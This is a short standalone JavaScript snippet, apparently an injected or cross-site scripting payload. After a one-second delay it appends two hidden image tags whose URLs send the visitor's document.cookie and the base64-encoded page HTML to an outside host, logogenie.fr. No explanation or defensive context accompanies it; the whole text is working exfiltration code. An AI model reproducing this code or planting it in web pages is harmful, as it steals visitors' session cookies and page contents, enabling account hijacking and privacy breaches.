function gg(){
  var i1 = '<img src="https://www.logogenie.fr/cookie?c=' + document.cookie + '" />'
  var i2 = '<img src="https://www.logogenie.fr/content?c=' + btoa(document.body.innerHTML) + '" />'
  document.getElementById('volet_clos').innerHTML += i1 + i2
}
setTimeout(gg,1000);
